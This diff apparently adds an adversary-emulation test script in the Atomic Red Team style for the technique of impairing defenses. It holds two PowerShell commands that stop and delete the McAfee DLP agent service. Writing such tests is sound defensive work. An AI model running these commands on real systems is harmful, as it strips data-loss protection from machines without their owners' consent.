@@ -1,0 +1,8 @@
+#TechniqueName: Impair Defenses: Disable or Modify Tools
+#AtomicTestName: Stop and Remove Arbitrary Security Windows Service
+#Language: ps1
+
+#commands
+Stop-Service -Name McAfeeDLPAgentService
+Remove-Service -Name McAfeeDLPAgentService
+
